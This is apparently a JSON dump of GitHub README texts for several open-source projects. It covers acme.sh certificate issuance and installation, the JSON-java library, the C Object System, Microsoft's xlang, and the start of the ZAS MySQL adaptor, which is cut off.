page](https:\/\/github.com\/Neilpang\/acme.sh\/wiki\/How-to-run-on-OpenWRT)\n|18|[![](https:\/\/neilpang.github.io\/acmetest\/status\/solaris.svg)](https:\/\/github.com\/Neilpang\/letest#here-are-the-latest-status)|SunOS\/Solaris\n|19|[![](https:\/\/neilpang.github.io\/acmetest\/status\/gentoo-stage3-amd64.svg)](https:\/\/github.com\/Neilpang\/letest#here-are-the-latest-status)|Gentoo Linux\n|20|[![Build Status](https:\/\/travis-ci.org\/Neilpang\/acme.sh.svg?branch=master)](https:\/\/travis-ci.org\/Neilpang\/acme.sh)|Mac OSX\n\nFor all build statuses, check our [weekly build project](https:\/\/github.com\/Neilpang\/acmetest):\n\nhttps:\/\/github.com\/Neilpang\/acmetest\n\n# Supported CA\n\n- Letsencrypt.org CA(default)\n- [BuyPass.com CA](https:\/\/github.com\/Neilpang\/acme.sh\/wiki\/BuyPass.com-CA)\n- [Pebble strict Mode](https:\/\/github.com\/letsencrypt\/pebble)\n\n# Supported modes\n\n- Webroot mode\n- Standalone mode\n- Standalone tls-alpn mode\n- Apache mode\n- Nginx mode\n- DNS mode\n- [DNS alias mode](https:\/\/github.com\/Neilpang\/acme.sh\/wiki\/DNS-alias-mode)\n- [Stateless mode](https:\/\/github.com\/Neilpang\/acme.sh\/wiki\/Stateless-Mode)\n\n\n# 1. How to install\n\n### 1. Install online\n\nCheck this project: https:\/\/github.com\/Neilpang\/get.acme.sh\n\n```bash\ncurl https:\/\/get.acme.sh | sh\n```\n\nOr:\n\n```bash\nwget -O -  https:\/\/get.acme.sh | sh\n```\n\n\n### 2. Or, Install from git\n\nClone this project and launch installation:\n\n```bash\ngit clone https:\/\/github.com\/Neilpang\/acme.sh.git\ncd .\/acme.sh\n.\/acme.sh --install\n```\n\nYou `don't have to be root` then, although `it is recommended`.\n\nAdvanced Installation: https:\/\/github.com\/Neilpang\/acme.sh\/wiki\/How-to-install\n\nThe installer will perform 3 actions:\n\n1. Create and copy `acme.sh` to your home dir (`$HOME`): `~\/.acme.sh\/`.\nAll certs will be placed in this folder too.\n2. Create alias for: `acme.sh=~\/.acme.sh\/acme.sh`.\n3. Create daily cron job to check and renew the certs if needed.\n\nCron entry example:\n\n```bash\n0 0 * * * \"\/home\/user\/.acme.sh\"\/acme.sh --cron --home \"\/home\/user\/.acme.sh\" > \/dev\/null\n```\n\nAfter the installation, you must close the current terminal and reopen it to make the alias take effect.\n\nOk, you are ready to issue certs now.\n\nShow help message:\n\n```sh\nroot@v1:~# acme.sh -h\n```\n\n# 2. Just issue a cert\n\n**Example 1:** Single domain.\n\n```bash\nacme.sh --issue -d example.com -w \/home\/wwwroot\/example.com\n```\n\nor:\n\n```bash\nacme.sh --issue -d example.com -w \/home\/username\/public_html\n```\n\nor:\n\n```bash\nacme.sh --issue -d example.com -w \/var\/www\/html\n```\n\n**Example 2:** Multiple domains in the same cert.\n\n```bash\nacme.sh --issue -d example.com -d www.example.com -d cp.example.com -w \/home\/wwwroot\/example.com\n```\n\nThe parameter `\/home\/wwwroot\/example.com` or `\/home\/username\/public_html` or `\/var\/www\/html` is the web root folder where you host your website files. You **MUST** have `write access` to this folder.\n\nSecond argument **\"example.com\"** is the main domain you want to issue the cert for.\nYou must have at least one domain there.\n\nYou must point and bind all the domains to the same webroot dir: `\/home\/wwwroot\/example.com`.\n\nThe certs will be placed in `~\/.acme.sh\/example.com\/`\n\nThe certs will be renewed automatically every **60** days.\n\nMore examples: https:\/\/github.com\/Neilpang\/acme.sh\/wiki\/How-to-issue-a-cert\n\n\n# 3. Install the cert to Apache\/Nginx etc.\n\nAfter the cert is generated, you probably want to install\/copy the cert to your Apache\/Nginx or other servers.\nYou **MUST** use this command to copy the certs to the target files, **DO NOT** use the certs files in **~\/.acme.sh\/** folder, they are for internal use only, the folder structure may change in the future.\n\n**Apache** example:\n```bash\nacme.sh --install-cert -d example.com \\\n--cert-file      \/path\/to\/certfile\/in\/apache\/cert.pem  \\\n--key-file       \/path\/to\/keyfile\/in\/apache\/key.pem  \\\n--fullchain-file \/path\/to\/fullchain\/certfile\/apache\/fullchain.pem \\\n--reloadcmd     \"service apache2 force-reload\"\n```\n\n**Nginx** example:\n```bash\nacme.sh --install-cert -d example.com \\\n--key-file       \/path\/to\/keyfile\/in\/nginx\/key.pem  \\\n--fullchain-file \/path\/to\/fullchain\/nginx\/cert.pem \\\n--reloadcmd     \"service nginx force-reload\"\n```\n\nOnly the domain is required, all the other parameters are optional.\n\nThe ownership and permission info of existing files are preserved. You can pre-create the files to define the ownership and permission.\n\nInstall\/copy the cert\/key to the production Apache or Nginx path.\n\nThe cert will be renewed every **60** days by default (which is configurable). Once the cert is renewed, the Apache\/Nginx service will be reloaded automatically by the command: `service apache2 force-reload` or `service nginx force-reload`.\n\n\n**Please take care:  The reloadcmd is very important. The cert can be automatically renewed, but, without a correct 'reloadcmd' the cert may not be flushed to your server(like nginx or apache), then your website will not be able to show renewed cert in 60 days.**\n\n# 4. Use Standalone server to issue cert\n\n**(requires you to be root\/sudoer or have permission to listen on port 80 (TCP))**\n\nPort `80` (TCP) **MUST** be free to listen on, otherwise you will be prompted to free it and try again.\n\n```bash\nacme.sh --issue --standalone -d example.com -d www.example.com -d cp.example.com\n```\n\nMore examples: https:\/\/github.com\/Neilpang\/acme.sh\/wiki\/How-to-issue-a-cert\n\n# 5. Use Standalone ssl server to issue cert\n\n**(requires you to be root\/sudoer or have permission to listen on port 443 (TCP))**\n\nPort `443` (TCP) **MUST** be free to listen on, otherwise you will be prompted to free it and try again.\n\n```bash\nacme.sh --issue --alpn -d example.com -d www.example.com -d cp.example.com\n```\n\nMore examples: https:\/\/github.com\/Neilpang\/acme.sh\/wiki\/How-to-issue-a-cert\n\n\n# 6. Use Apache mode\n\n**(requires you to be root\/sudoer, since it is required to interact with Apache server)**\n\nIf you are running a web server, Apache or Nginx, it is recommended to use the `Webroot mode`.\n\nParticularly, if you are running an Apache server, you can use Apache mode instead. This mode doesn't write any files to your web root folder.\n\nJust set string \"apache\" as the second argument and it will force use of apache plugin automatically.\n\n```sh\nacme.sh --issue --apache -d example.com -d www.example.com -d cp.example.com\n```\n\n**This apache mode is only to issue the cert, it will not change your apache config files.\nYou will need to configure your website config files to use the cert by yourself.\nWe don't want to mess your apache server, don't worry.**\n\nMore examples: https:\/\/github.com\/Neilpang\/acme.sh\/wiki\/How-to-issue-a-cert\n\n# 7. Use Nginx mode\n\n**(requires you to be root\/sudoer, since it is required to interact with Nginx server)**\n\nIf you are running a web server, Apache or Nginx, it is recommended to use the `Webroot mode`.\n\nParticularly, if you are running an nginx server, you can use nginx mode instead. This mode doesn't write any files to your web root folder.\n\nJust set string \"nginx\" as the second argument.\n\nIt will configure nginx server automatically to verify the domain and then restore the nginx config to the original version.\n\nSo, the config is not changed.\n\n```sh\nacme.sh --issue --nginx -d example.com -d www.example.com -d cp.example.com\n```\n\n**This nginx mode is only to issue the cert, it will not change your nginx config files.\nYou will need to configure your website config files to use the cert by yourself.\nWe don't want to mess your nginx server, don't worry.**\n\nMore examples: https:\/\/github.com\/Neilpang\/acme.sh\/wiki\/How-to-issue-a-cert\n\n# 8. Automatic DNS API integration\n\nIf your DNS provider supports API access, we can use that API to automatically issue the certs.\n\nYou don't have to do anything manually!\n\n### Currently acme.sh supports most of the dns providers:\n\nhttps:\/\/github.com\/Neilpang\/acme.sh\/wiki\/dnsapi\n\n# 9. Use DNS manual mode:\n\nSee: https:\/\/github.com\/Neilpang\/acme.sh\/wiki\/dns-manual-mode first.\n\nIf your dns provider doesn't support any api access, you can add the txt record by your hand.\n\n```bash\nacme.sh --issue --dns -d example.com -d www.example.com -d cp.example.com\n```\n\nYou should get an output like below:\n\n```sh\nAdd the following txt record:\nDomain:_acme-challenge.example.com\nTxt value:9ihDbjYfTExAYeDs4DBUeuTo18KBzwvTEjUnSwd32-c\n\nAdd the following txt record:\nDomain:_acme-challenge.www.example.com\nTxt value:9ihDbjxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n\nPlease add those txt records to the domains. Waiting for the dns to take effect.\n```\n\nThen just rerun with `renew` argument:\n\n```bash\nacme.sh --renew -d example.com\n```\n\nOk, it's done.\n\n**Take care, this is dns manual mode, it can not be renewed automatically. you will have to add a new txt record to your domain by your hand when you renew your cert.**\n\n**Please use dns api mode instead.**\n\n# 10. Issue ECC certificates\n\n`Let's Encrypt` can now issue **ECDSA** certificates.\n\nAnd we support them too!\n\nJust set the `keylength` parameter with a prefix `ec-`.\n\nFor example:\n\n### Single domain ECC certificate\n\n```bash\nacme.sh --issue -w \/home\/wwwroot\/example.com -d example.com --keylength ec-256\n```\n\n### SAN multi domain ECC certificate\n\n```bash\nacme.sh --issue -w \/home\/wwwroot\/example.com -d example.com -d www.example.com --keylength ec-256\n```\n\nPlease look at the `keylength` parameter above.\n\nValid values are:\n\n1. **ec-256 (prime256v1, \"ECDSA P-256\")**\n2. **ec-384 (secp384r1,  \"ECDSA P-384\")**\n3. **ec-521 (secp521r1,  \"ECDSA P-521\", which is not supported by Let's Encrypt yet.)**\n\n\n\n# 11. Issue Wildcard certificates\n\nIt's simple, just give a wildcard domain as the `-d` parameter.\n\n```sh\nacme.sh  --issue -d example.com  -d '*.example.com'  --dns dns_cf\n```\n\n\n\n# 12. How to renew the certs\n\nNo, you don't need to renew the certs manually. All the certs will be renewed automatically every **60** days.\n\nHowever, you can also force to renew a cert:\n\n```sh\nacme.sh --renew -d example.com --force\n```\n\nor, for ECC cert:\n\n```sh\nacme.sh --renew -d example.com --force --ecc\n```\n\n\n# 13. How to stop cert renewal\n\nTo stop renewal of a cert, you can execute the following to remove the cert from the renewal list:\n\n```sh\nacme.sh --remove -d example.com [--ecc]\n```\n\nThe cert\/key file is not removed from the disk.\n\nYou can remove the respective directory (e.g. `~\/.acme.sh\/example.com`) by yourself.\n\n\n# 14. How to upgrade `acme.sh`\n\nacme.sh is in constant development, so it's strongly recommended to use the latest code.\n\nYou can update acme.sh to the latest code:\n\n```sh\nacme.sh --upgrade\n```\n\nYou can also enable auto upgrade:\n\n```sh\nacme.sh --upgrade --auto-upgrade\n```\n\nThen **acme.sh** will be kept up to date automatically.\n\nDisable auto upgrade:\n\n```sh\nacme.sh --upgrade --auto-upgrade 0\n```\n\n\n# 15. Issue a cert from an existing CSR\n\nhttps:\/\/github.com\/Neilpang\/acme.sh\/wiki\/Issue-a-cert-from-existing-CSR\n\n\n# 16. Send notifications in cronjob\n\nhttps:\/\/github.com\/Neilpang\/acme.sh\/wiki\/notify\n\n\n# 17. Under the Hood\n\nSpeak ACME language using shell, directly to \"Let's Encrypt\".\n\nTODO:\n\n\n# 18. Acknowledgments\n\n1. Acme-tiny: https:\/\/github.com\/diafygi\/acme-tiny\n2. ACME protocol: https:\/\/github.com\/ietf-wg-acme\/acme\n\n\n## Contributors\n\n### Code Contributors\n\nThis project exists thanks to all the people who contribute. [[Contribute](CONTRIBUTING.md)].\n<a href=\"https:\/\/github.com\/Neilpang\/acme.sh\/graphs\/contributors\"><img src=\"https:\/\/opencollective.com\/acmesh\/contributors.svg?width=890&button=false\" \/><\/a>\n\n### Financial Contributors\n\nBecome a financial contributor and help us sustain our community. [[Contribute](https:\/\/opencollective.com\/acmesh\/contribute)]\n\n#### Individuals\n\n<a href=\"https:\/\/opencollective.com\/acmesh\"><img src=\"https:\/\/opencollective.com\/acmesh\/individuals.svg?width=890\"><\/a>\n\n#### Organizations\n\nSupport this project with your organization. Your logo will show up here with a link to your website. [[Contribute](https:\/\/opencollective.com\/acmesh\/contribute)]\n\n<a href=\"https:\/\/opencollective.com\/acmesh\/organization\/0\/website\"><img src=\"https:\/\/opencollective.com\/acmesh\/organization\/0\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/acmesh\/organization\/1\/website\"><img src=\"https:\/\/opencollective.com\/acmesh\/organization\/1\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/acmesh\/organization\/2\/website\"><img src=\"https:\/\/opencollective.com\/acmesh\/organization\/2\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/acmesh\/organization\/3\/website\"><img src=\"https:\/\/opencollective.com\/acmesh\/organization\/3\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/acmesh\/organization\/4\/website\"><img src=\"https:\/\/opencollective.com\/acmesh\/organization\/4\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/acmesh\/organization\/5\/website\"><img src=\"https:\/\/opencollective.com\/acmesh\/organization\/5\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/acmesh\/organization\/6\/website\"><img src=\"https:\/\/opencollective.com\/acmesh\/organization\/6\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/acmesh\/organization\/7\/website\"><img src=\"https:\/\/opencollective.com\/acmesh\/organization\/7\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/acmesh\/organization\/8\/website\"><img src=\"https:\/\/opencollective.com\/acmesh\/organization\/8\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/acmesh\/organization\/9\/website\"><img src=\"https:\/\/opencollective.com\/acmesh\/organization\/9\/avatar.svg\"><\/a>\n\n# 19. License & Others\n\nLicense is GPLv3\n\nPlease Star and Fork me.\n\n[Issues](https:\/\/github.com\/Neilpang\/acme.sh\/issues) and [pull requests](https:\/\/github.com\/Neilpang\/acme.sh\/pulls) are welcome.\n\n\n# 20. Donate\nYour donation makes **acme.sh** better:\n\n1. PayPal\/Alipay(\u652f\u4ed8\u5b9d)\/Wechat(\u5fae\u4fe1): [https:\/\/donate.acme.sh\/](https:\/\/donate.acme.sh\/)\n\n[Donate List](https:\/\/github.com\/Neilpang\/acme.sh\/wiki\/Donate-list)\n"},{"repo":"\/stleary\/JSON-java","language":"Java","readme_contents":"JSON in Java [package org.json]\n===============================\n\n[![Maven Central](https:\/\/img.shields.io\/maven-central\/v\/org.json\/json.svg)](https:\/\/mvnrepository.com\/artifact\/org.json\/json)\n\n**[Click here if you just want the latest release jar file.](https:\/\/repo1.maven.org\/maven2\/org\/json\/json\/20190722\/json-20190722.jar)**\n\nJSON is a light-weight, language independent, data interchange format.\nSee http:\/\/www.JSON.org\/\n\nThe files in this package implement JSON encoders\/decoders in Java.\nIt also includes the capability to convert between JSON and XML, HTTP\nheaders, Cookies, and CDL.\n\nThis is a reference implementation. There is a large number of JSON packages\nin Java. Perhaps someday the Java community will standardize on one. Until\nthen, choose carefully.\n\nThe license includes this restriction: \"The software shall be used for good,\nnot evil.\" If your conscience cannot live with that, then choose a different\npackage.\n\nThe package compiles on Java 1.6-1.8.\n\n\n**JSONObject.java**: The `JSONObject` can parse text from a `String` or a `JSONTokener`\nto produce a map-like object. The object provides methods for manipulating its\ncontents, and for producing a JSON compliant object serialization.\n\n**JSONArray.java**: The `JSONArray` can parse text from a String or a `JSONTokener`\nto produce a vector-like object. The object provides methods for manipulating\nits contents, and for producing a JSON compliant array serialization.\n\n**JSONTokener.java**: The `JSONTokener` breaks a text into a sequence of individual\ntokens. It can be constructed from a `String`, `Reader`, or `InputStream`.\n\n**JSONException.java**: The `JSONException` is the standard exception type thrown\nby this package.\n\n**JSONPointer.java**: Implementation of\n[JSON Pointer (RFC 6901)](https:\/\/tools.ietf.org\/html\/rfc6901). Supports\nJSON Pointers both in the form of string representation and URI fragment\nrepresentation.\n\n**JSONPropertyIgnore.java**: Annotation class that can be used on Java Bean getter methods.\nWhen used on a bean method that would normally be serialized into a `JSONObject`, it\noverrides the getter-to-key-name logic and forces the property to be excluded from the\nresulting `JSONObject`.\n\n**JSONPropertyName.java**: Annotation class that can be used on Java Bean getter methods.\nWhen used on a bean method that would normally be serialized into a `JSONObject`, it\noverrides the getter-to-key-name logic and uses the value of the annotation. The Bean\nprocessor will look through the class hierarchy. This means you can use the annotation on\na base class or interface and the value of the annotation will be used even if the getter\nis overridden in a child class.   \n\n**JSONString.java**: The `JSONString` interface requires a `toJSONString` method,\nallowing an object to provide its own serialization.\n\n**JSONStringer.java**: The `JSONStringer` provides a convenient facility for\nbuilding JSON strings.\n\n**JSONWriter.java**: The `JSONWriter` provides a convenient facility for building\nJSON text through a writer.\n\n\n**CDL.java**: `CDL` provides support for converting between JSON and comma\ndelimited lists.\n\n**Cookie.java**: `Cookie` provides support for converting between JSON and cookies.\n\n**CookieList.java**: `CookieList` provides support for converting between JSON and\ncookie lists.\n\n**HTTP.java**: `HTTP` provides support for converting between JSON and HTTP headers.\n\n**HTTPTokener.java**: `HTTPTokener` extends `JSONTokener` for parsing HTTP headers.\n\n**XML.java**: `XML` provides support for converting between JSON and XML.\n\n**JSONML.java**: `JSONML` provides support for converting between JSONML and XML.\n\n**XMLTokener.java**: `XMLTokener` extends `JSONTokener` for parsing XML text.\n\nUnit tests are maintained in a separate project. Contributing developers can test\nJSON-java pull requests with the code in this project:\nhttps:\/\/github.com\/stleary\/JSON-Java-unit-test\n\nNumeric types in this package comply with\n[ECMA-404: The JSON Data Interchange Format](http:\/\/www.ecma-international.org\/publications\/files\/ECMA-ST\/ECMA-404.pdf) and\n[RFC 8259: The JavaScript Object Notation (JSON) Data Interchange Format](https:\/\/tools.ietf.org\/html\/rfc8259#section-6).\nThis package fully supports `Integer`, `Long`, and `Double` Java types. Partial support\nfor `BigInteger` and `BigDecimal` values in `JSONObject` and `JSONArray` objects is provided\nin the form of `get()`, `opt()`, and `put()` API methods.\n\nAlthough 1.6 compatibility is currently supported, it is not a project goal and may be\nremoved in some future release.\n\nIn compliance with RFC8259 page 10 section 9, the parser is more lax with what is valid\nJSON than the Generator. For Example, the tab character (U+0009) is allowed when reading\nJSON Text strings, but when output by the Generator, tab is properly converted to \\t in\nthe string. Other instances may occur where reading invalid JSON text does not cause an\nerror to be generated. Malformed JSON Texts such as missing end \" (quote) on strings or\ninvalid number formats (1.2e6.3) will cause errors as such documents can not be read\nreliably.\n\nSome notible exceptions that the JSON Parser in this library accepts are:\n* Unquoted keys `{ key: \"value\" }`\n* Unquoted values `{ \"key\": value }`\n* Unescaped literals like \"tab\" in string values `{ \"key\": \"value   with an unescaped tab\" }`\n* Numbers out of range for `Double` or `Long` are parsed as strings\n\nRelease history:\n\n~~~\n20190722    Recent commits\n\n20180813    POM change to include Automatic-Module-Name (#431)\n\n20180130    Recent commits\n\n20171018    Checkpoint for recent commits.\n\n20170516    Roll up recent commits.\n\n20160810    Revert code that was breaking opt*() methods.\n\n20160807    This release contains a bug in the JSONObject.opt*() and JSONArray.opt*() methods,\nit is not recommended for use.\nJava 1.6 compatability fixed, JSONArray.toList() and JSONObject.toMap(),\nRFC4180 compatibility, JSONPointer, some exception fixes, optional XML type conversion.\nContains the latest code as of 7 Aug, 2016\n\n20160212    Java 1.6 compatibility, OSGi bundle. Contains the latest code as of 12 Feb, 2016.\n\n20151123    JSONObject and JSONArray initialization with generics. Contains the\nlatest code as of 23 Nov, 2015.\n\n20150729    Checkpoint for Maven central repository release. Contains the latest code\nas of 29 July, 2015.\n~~~\n\n\nJSON-java releases can be found by searching the Maven repository for groupId \"org.json\"\nand artifactId \"json\". For example:\nhttps:\/\/search.maven.org\/search?q=g:org.json%20AND%20a:json&core=gav\n"},{"repo":"\/CObjectSystem\/COS","language":"C","readme_contents":"#\n#  C Object System\n#  Copyright 2007+ Laurent Deniau <laurent.deniau at gmail dot com>\n#\n\nThe motivation to develop the C Object System (COS) on top of the C language may\nnot be obvious. While many new languages appear each year with new syntax and\nlittle new concepts, I prefer to try to lift C up to the level of other high\nlevel languages. C is portable, efficient, widely available and standardised.\nThis is probably why it is also the reference for other languages when memory\nand speed efficiency matter and why most languages have a Foreign Function\nInterface to C. Still, many virtual machines, interpreters, compilers or\noperating systems are written in C. If one often blame C to be a low level\nlanguage similar to a super assembler, it should be worthwhile to raise C to the\nlevel of the other high level Object Oriented languages and beyond. This is the\naim of COS, itself entirely written in ISO C.\n\nCOS uses the C99 preprocessor to parse its DSL (Domain Specific Language)\nembedded in C files and to generate pure C89 code on-the-fly during the\ntranslation phases of C compilers, using its advanced framework of C99 macros.\nThe design and the DSL of COS are strongly inspired by Objective-C and CLOS\n(Common Lisp Object System), one of the most flexible object model ever\ndeveloped, and to some lesser extend by Cecil, Dylan, Haskell, Python, Slate and\nSmallTalk. Contrary to CLOS, COS enforces strong encapsulation and separation of\nconcerns through its open object model, which allows to use and to extend COS\ncomponents (e.g. classes) defined in shared libraries without having the source\ncode (see papers).\n\nThe core of COS is only 7,000 SLOC and fulfils very well the five principles it\naims: simplicity, flexibility, extensibility, efficiency and portability. It is\navailable on GitHub and described in DLS'09 and OOPSLA'09 papers, and a\npresentation available in the doc directory. It tries to keep minimal the\navailable concepts for the sake of simplicity and flexibility: uniform object\nmodel, open classes, metaclasses, property metaclasses, generics, multimethods,\ndelegation, ownership, properties, exceptions, contracts and closures.\n\nCOS design is tuned to provide efficient portable implementation of these\nconcepts, especially for its two key features: dynamic message dispatch\nsupporting multimethods (i.e. many receivers) as well as generic message\nforwarding (i.e. delegation without limitations). COS message dispatch is\nx1.7-x2.3 slower than indirect function call (called through pointers) and about\nx1.2-x1.5 faster than Objective-C message dispatch. COS message forwarding is as\nfast as message dispatch and about x40-x80 faster than Objective-C message\nforwarding, which has strong limitations on the returned values. On top of these\ntwo efficient concepts, it is easy to implement high order messages, class-\npredicate dispatch, multiple inheritance, dynamic inheritance, dynamic classes,\nadaptive object model, reflection and advanced memory management (some of them\nare described in the papers).\n\nCOS achieves the principles of simplicity, flexibility and extensibility as well\nas existing mainstream scripting languages (e.g. PHP, Python, Ruby, Lua,\nSmallTalk) while keeping the efficiency and the portability in the range of C.\nIt can be used as both a dynamically or a statically typed programming language\n(see fast sorting of heterogeneous Array for an example of mixed use). COS is\nalso designed for parallelisation, and it is compliant with TLS (Thread Local\nStorage), OpenMP and POSIX threads. Its minimal requirement is a C99\npreprocessor and a C89 compiler.\n\nProject information:\n--------------------\n\n  - web site : http:\/\/github.com\/CObjectSystem\n  - license  : http:\/\/www.apache.org\/licenses\/LICENSE-2.0\n  - contact  : laurent.deniau at gmail dot com\n\nDocumentation:\n--------------\n\npaper and presentation can be found in\npath-to-cos\/doc\/\n\nor after installation to\n$(PREFIX)\/$(DOCDIR)\/cos\/\n\nor on arXiv.org\n\nWiki on CLOS:\nhttp:\/\/en.wikipedia.org\/wiki\/Common_Lisp_Object_System\n\nWiki on multiple dispatch:\nhttp:\/\/en.wikipedia.org\/wiki\/Multiple_dispatch#C\n\nMakefile examples:\n------------------\n\n# distrib\npath-to-cos\/Makefile\n\n# library\npath-to-cos\/CosBase\/Makefile\n\n# program\npath-to-cos\/CosBase\/examples\/ex??\/Makefile\n\n# tests (program with auto-run)\npath-to-cos\/CosBase\/tests\/Makefile\n\nDebugging makefiles:\n--------------------\n\nmake [target] SHOW=yes\n\n# debug flags\nSHOW will show the commands run\n\nCode examples:\n--------------\n\npath-to-cos\/CosBase\/examples\npath-to-cos\/CosBase\/tests\n\nSupported platforms:\n--------------------\n\nnote: platforms name are detected using the posix command \"uname -s\"\n\nthe list of supported platforms are in the directory\npath-to-cos\/CosBase\/include\/cos\/cfg\/\n\nor after installation to\n$(PREFIX)\/$(INCDIR)\/cos\/cfg\/\n\nporting on Unixes\/Posix compliant platform should be straightforward\nporting on Windows requires some Posix-like environment (e.g. Mingw, Cygwin)\n\nTested platforms:\n-----------------\n\n# Systems & Architectures\nLinux Ubuntu from 8.04 to 12.04 on i386 and x86_64 multicore\nMac OSX from Leopard to El Capitan on x86_64 multicore\nWindows from 7 to 10 on x86_64 multicore using MSys2 (mingw64)\n\n# Compilers\ngcc from 3.2.3 to 4.8.5, 7.2.0, and 8.2.0\n\nOther available platforms (untested):\n-------------------------------------\nSunOS + gcc\nFreeBSD + gcc\n"},{"repo":"\/microsoft\/xlang","language":"C++","readme_contents":"# xlang\n\nThis repo is the starting point for the xlang project, which enables developers to take existing shared libraries,\nimplemented in one programming language and make that library's APIs available to client code using a different programming language. Thus the name \"xlang\", for cross-language.  \n\nSee these related repos:\n\n|Repository|Status|\n|-|-|\n|[C++\/WinRT](https:\/\/github.com\/microsoft\/cppwinrt)|[![Build status](https:\/\/dev.azure.com\/microsoft\/Dart\/_apis\/build\/status\/cppwinrt%20internal%20build)](https:\/\/dev.azure.com\/microsoft\/Dart\/_build\/latest?definitionId=31784)|\n|[C++ winmd parser](https:\/\/github.com\/microsoft\/winmd)|[![Build Status](https:\/\/dev.azure.com\/microsoft\/Dart\/_apis\/build\/status\/WinMD%20Nuget?branchName=master)](https:\/\/dev.azure.com\/microsoft\/Dart\/_build\/latest?definitionId=44715&branchName=master)|\n|[Rust winmd parser](https:\/\/github.com\/microsoft\/winmd-rs)|[![Build Status](https:\/\/dev.azure.com\/microsoft\/Dart\/_apis\/build\/status\/microsoft.winmd-rs?branchName=master)](https:\/\/dev.azure.com\/microsoft\/Dart\/_build\/latest?definitionId=45839&branchName=master)|\n[WinRT test component](https:\/\/github.com\/microsoft\/TestWinRT)|[![Build Status](https:\/\/dev.azure.com\/microsoft\/Dart\/_apis\/build\/status\/TestWinRT?branchName=master)](https:\/\/dev.azure.com\/microsoft\/Dart\/_build\/latest?definitionId=45310&branchName=master)|\n\nAdditionally, the xlang toolset will be available on multiple operating systems.\nThis means that if your shared library is portable to various operating systems,\nthen you can use the xlang tooling to make that shared library available to various client programming language on those various platforms.\n\nMore succinctly, you can take a library written in language A and make it available to language B applications running on platform C. The set of supported languages and platforms will expand as the project progresses.\n\nThe xlang project is in a very, very early stage of development.\nThe project wants and encourages community feedback and contributions. As such, the xlang team is doing *all* xlang project development in the open on GitHub. \n\n## What xlang is NOT\n\n* The xlang project is not a port of the Windows Runtime, COM, DCOM or related technology.\n* The xlang project will not port the Windows Runtime APIs.\n\n## Project details\n\nFor details on project structure and build process, please see the [Project Readme](.\/src\/readme.md).\n\nFor technical design details, please see the [Design Notes](.\/design_notes).\n\n## License\n\nCode licensed under the [MIT License](LICENSE).\n\n## Contributing\n\nThis project welcomes contributions and suggestions.  Most contributions require you to agree to a\nContributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us\nthe rights to use your contribution. For details, visit https:\/\/cla.microsoft.com.\n\nWhen you submit a pull request, a CLA-bot will automatically determine whether you need to provide\na CLA and decorate the PR appropriately (e.g., label, comment). Simply follow the instructions\nprovided by the bot. You will only need to do this once across all repos using our CLA.\n\nThis project has adopted the [Microsoft Open Source Code of Conduct](https:\/\/opensource.microsoft.com\/codeofconduct\/).\nFor more information see the [Code of Conduct FAQ](https:\/\/opensource.microsoft.com\/codeofconduct\/faq\/) or\ncontact [opencode@microsoft.com](mailto:opencode@microsoft.com) with any additional questions or comments.\n\n"},{"repo":"\/oun111\/zas","language":"C++","readme_contents":"\n## What is ZAS\n - ZAS\uff08Zhou\u2019s Adaptor of Sql\uff09is being developed based on the `MYSQL Client\/Server Protocol`\n - ZAS is a C++ library that used by applications to access MYSQL databases\n - ZAS can translate SQL syntax automatically \n\n\n## Features\n - Cross platforms: 32\/64 bit processors supports, linux and windows supports\n - Cross languages: you may use ZAS with c++, java, python\n - Provides OTLV4-compatible interfaces\n - Provides automatically SQL syntax translations that is transparent to upper applications\n - Supports most SQL syntaxs in ORACLE\/MYSQL \n - Good performance in SQL syntax analyzing\n - The underlying `MYSQL Client\/Server Protocol` is being optimized\n - Conceals complexities of `MYSQL Client\/Server Protocol`\n - Good extensibility\n - Being tested over a year and runs steadily\n\n\n## Structure\n\n ![Alt text](https:\/\/github.com\/oun111\/images\/blob\/master\/zas_structure.png)\n\n - Connection String processor: processes the DB connection strings including Oracle TNS and traditional DSN format\n - Protocol Management(the `MYSQLC` libray) provides:\n    1. implementations of the `MYSQL Client\/Server Protocol`\n    2. fully support for the `prepare` and `query` mode\n    3. API compatibilities with `libmysqlclient`\n - SQL Syntax Engine: performs SQL syntax analyzing\/checking\/translations\n - OTLV4 Compatible API: provides a set of c++ classes that compatible with OTLV4 libraries\n\n\n## Process Flow\n\n ![Alt text](https:\/\/github.com\/oun111\/images\/blob\/master\/zas_process_flow.png)\n\n - First of all, the application should call `rlogon() ` to parse connection strings and to do database login \n - Second, the application should call `open()` to initialize the SQL and translate it\n - Third, the application should input enough place holder values to execute the statement\n - Last, fetching the result\n - Further more, one can `reopen` a new SQL or `execute` the old one again\n \n \n## Connection String Handling\n\n ![Alt text](https:\/\/github.com\/oun111\/images\/blob\/master\/zas_conn_str.png)\n\n - When login, the connection string is passed to the `connection string processor` which will test  the inputed string\n    1. if it\u2019s TNS format, the processor will parse the TNS file for login informations\n    2. if it\u2019s DSN format, the processor will parse it directly\n    3. otherwise, throws C++ exception \n\n\n## the SQL Syntax Engine\n\n ![Alt text](https:\/\/github.com\/oun111\/images\/blob\/master\/zas_syntax_engine.png)\n\n - when a SQL is inputed, it would be processed by a hard-coding  parser and be translated to a syntax tree\n - if no errors, the tree will be scaned for syntax errors\n - if everythings\u2019 ok, the tree will be scaned again for `translation points` to being translated to `MYSQL-style` syntax\n - then, all place-holders within the tree will be processed\n - last, the tree will be serialized to string form and passed to output\n\n\n## The MYSQLC library\n\n - The library provides the following functionalities: database login, SQL execution, result fetching, protocol compression, connection maintainance\n - The protocol compression invokes the `deflate` algorithm from zlib \n - The library employs the `ping` protocol to maintain the database connection\n - To execute a SQL statement, the application may use `query mode` with which all place holder values are embeded within the SQL statement string that will be sent to server by a single `com_query` request, here\u2019s the diagram:\n\n ![Alt text](https:\/\/github.com\/oun111\/images\/blob\/master\/zas_query.png)\n\n\n - The application may also execute SQL under `prepare mode`. The SQL execution progress is seperated into 2 requests:\n    1. the primordial SQL statement is sent to server by `com_stmt_prepare` to 